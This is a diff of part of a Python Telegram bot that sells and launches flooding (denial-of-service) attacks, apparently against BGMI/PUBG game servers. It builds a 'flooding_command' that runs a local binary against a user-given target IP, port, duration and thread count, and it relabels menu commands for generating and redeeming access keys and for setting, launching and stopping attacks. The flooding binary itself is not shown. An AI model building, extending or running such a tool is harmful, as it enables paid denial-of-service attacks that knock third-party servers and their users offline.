@@ -124,7 +124,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./pubg', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'🔰 🆃︎🅰︎🆁︎🅶︎🅴︎🆃 ︎ 🆂︎🅴︎🆃 🔰︎\n\n👙 🅃🄰🅁🄶🄴🅃 ᕗ {target_ip}\n🍆 🄿🄾🅁🅃 ᕗ {port} \n⏳ 🄳🅄🅁🄰🅃🄾🄸🄽 ᕗ {duration}\n\n𝙏𝘼𝙋 𝙏𝙊 𝙎𝙏𝘼𝙍𝙏 𝘽𝙐𝙏𝙏𝙊𝙉')
 
 
@@ -179,11 +179,11 @@ async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     
     response = (
         "𝘼𝙇𝙇 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎\n\n"
-        "/genkey-> ༒︎  𝙁𝙊𝙍 𝙂𝙀𝙉𝙍𝘼𝙏𝙀 𝙆𝙀𝙔\n"
-        "/redeem-> ༒ ︎𝙁𝙊𝙍 𝙍𝙀𝘿𝙀𝙀𝙈 𝙆𝙀𝙔\n"
-        "/bgmi->   ༒︎ 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙏𝘼𝙍𝙂𝙀𝙏 𝙎𝙀𝙏\n"
-        "/start->   ༒ ︎𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏\n"
-        "/stop->   ༒︎ 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝙊𝙋\n\n"
+        "/genkey-> ༒︎ genrate you key\n"
+        "/redeem-> ༒ ︎ redeem your key\n"
+        "/bgmi->   ༒︎ set your attack target\n"
+        "/start->   ༒ ︎tap to launch attack \n"
+        "/stop->   ༒︎ tap to attack Stopd\n\n"
         f"✅𝙊𝙒𝙉𝙀𝙍-> {OWNER_USERNAME}"
     ) # Send message with the keyboard buttons
     await update.message.reply_text(response, reply_markup=markup)
